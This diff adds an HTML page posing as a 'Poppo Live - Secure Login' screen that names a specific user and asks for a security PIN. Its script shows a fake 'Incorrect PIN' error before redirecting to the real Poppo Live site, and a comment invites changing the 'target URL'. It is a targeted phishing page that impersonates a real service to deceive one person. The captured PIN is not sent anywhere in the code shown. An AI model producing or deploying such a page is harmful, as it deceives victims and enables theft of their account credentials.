@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Poppo Live - Secure Login</title>
+    <style>
+        /* Import Google Font */
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #6e45e2, #88d3ce);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        /* Login Container */
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            color: #fff;
+        }
+
+        /* Poppo Logo */
+        .logo {
+            font-size: 28px;
+            font-weight: 700;
+            color: #ffdd57;
+            text-transform: uppercase;
+            margin-bottom: 15px;
+            letter-spacing: 1px;
+        }
+
+        h2 {
+            font-size: 24px;
+            font-weight: 600;
+        }
+
+        p {
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        /* Input Fields */
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 8px;
+            outline: none;
+            font-size: 14px;
+        }
+        span{
+          color :yellow;
+          font-weight: bold;
+        }
+
+        /* Login Button */
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: #ff6f61;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            color: white;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .login-btn:hover {
+            background: #e85a4f;
+        }
+
+        /* Error Message */
+        .error {
+            color: #ff4b5c;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <div class="logo">Poppo Live</div>  <!-- Poppo Branding -->
+        
+        <h2>Welcome,<span> Abebaw-A.G</span></h2>
+        <p>Please enter your security PIN to verify it's you.</p>
+
+        <form id="loginForm">
+            <input type="text" id="username" value="Abebaw-A.G" disabled>
+            <input type="number" id="pin" placeholder="Enter your PIN code" required>
+            <button type="submit" class="login-btn">Verify</button>
+            <p class="error" id="errorMessage"></p>
+        </form>
+    </div>
+
+    <script>
+        let attempt = 1; // Track login attempts
+        const maxAttempts = 3; // Number of times to say "Incorrect PIN"
+
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            
+            let pin = document.getElementById("pin").value;
+            let errorMessage = document.getElementById("errorMessage");
+
+            attempt++; // Increase attempt count
+
+            if (attempt <= maxAttempts) {
+                errorMessage.textContent = `Incorrect PIN.`;
+            } else {
+               
+                window.location.href = "https://www.poppolive.com/"; // Change this to your target URL
+            }
+        });
+    </script>
+
+</body>
+</html>
